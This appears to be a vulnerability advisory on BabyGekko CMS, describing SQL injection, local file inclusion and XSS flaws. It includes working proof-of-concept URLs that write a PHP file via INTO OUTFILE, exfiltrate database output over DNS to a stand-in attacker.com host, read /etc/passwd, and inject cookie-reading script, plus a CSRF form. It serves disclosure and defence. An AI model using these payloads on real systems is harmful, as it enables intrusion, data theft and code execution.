Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in BabyGekko, which can be exploited to include local PHP files, perform SQL Injection and Cross-Site Scripting (XSS) attacks.


1) Multiple SQL Injections in BabyGekko

Two SQL injections exist in BabyGekko administrator's panel but their exploitation demands administrator's privileges. However they can also be exploited by a non-authenticated malicious user via CSRF vector, because "/admin/index.php" script is also vulnerable to CSRF attack. In order to do so he has to make logged-in administrator visit a malicious page.

1.1 The vulnerability exists due to insufficient validation of input passed via the "keyword" parameter to "/admin/index.php" (when "app" is set to "users"). A remote authenticated administrator can manipulate SQL queries and execute arbitrary SQL commands within application's database.

The following PoC (Proof-of-Concept) will create (depending on web server and database permissions) a file "/tmp/.class.php" and writes "<?phpinfo()?>" into it:

http://[host]/admin/index.php?app=users&ajax=1&action=search&keyword=1%27%29%20UNION%20SELECT%201,2,3,4,5,6,7,8,%27%3C?%20phpinfo%28%29;%20?%3E%27%20INTO%20OUTFILE%20%27/tmp/.class.php%27%20--%202%20

The second PoC code below is based on DNS Exfiltration technique and may be used in cases when application's database is hosted on a Windows system. The PoC sends a DNS request to resolve an IP address for the `version()` (or any other sensitive output from the database) subdomain of ".attacker.com", located on attacker controlled DNS server:

http://[host]/admin/index.php?app=users&ajax=1&action=search&keyword=%27 OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) --

1.2 The vulnerability exists due to insufficient validation of input passed via the "query" parameter to "/admin/index.php". A remote authenticated administrator can manipulate SQL queries and execute arbitrary SQL commands within application's database.

The following PoC will create (depending on web server and database permissions) a file "/tmp/.class.php" and writes "<?phpinfo()?>" into it:

http://[host]/admin/index.php?app=html&action=getlistofusers&query=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,%27%3C?%20phpinfo%28%29;%20?%3E%27%20INTO%20OUTFILE%20%27/tmp/.class.php%27%20--%202%20

The second PoC code below is based on DNS Exfiltration technique and may be used in cases when application's database is hosted on a Windows system. The PoC sends a DNS request to resolve an IP address for the `version()` (or any other sensitive output from the database) subdomain of ".attacker.com", located on attacker controlled DNS server:

http://[host]/admin/index.php?app=html&action=getlistofusers&query=%27 OR 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) --


2) Local File Inclusion in BabyGekko

The vulnerability exists due to insufficient validation of input passed via the "app" parameter to "index.php". A remote attacker can include arbitrary files from local system using directory traversal sequences with NULL byte.

The following PoC will show the "/etc/passwd" file:

http://[host]/index.php?app=../../../../../../../etc/passwd%00

Second PoC demonstrates inclusion of "/tmp/.class.php" file created during exploitation of vulnerabilities 1.1 or 1.2. Depending on server configuration and permissions it will show the results of "phpinfo()" function execution:

http://[host]/index.php?app=../../../../../../../tmp/


3) Multiple Cross-Site Scripting (XSS) in BabyGekko

3.1 Input passed via the "id" parameter to "/admin/index.php" is not properly sanitized. A remote attacker can execute arbitrary HTML and script code in administrator's browser in context of vulnerable website.

The following PoC code demonstrates the vulnerability:

http://[host]/admin/index.php?app=templates&action=edititem&id=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

3.2 Insufficient sanitation of input passed via the "username" and "password" HTTP POST parameters to the "index.php" can be used to inject and execute arbitrary HTML and script code in user's browser in context of vulnerable website. Successful exploitation of this vulnerability requires "loginbox" block to be activated.

The following PoC code demonstrates the vulnerability:


<form action="http://[host]/index.php" method="post" enctype="multipart/form-data">
<input type="hidden" name="username" value='"><script>alert(document.cookie);</script>' />
<input type="hidden" name="password" value='"><script>alert(document.cookie);</script>' />
<input type="submit" id="btn">
</form>
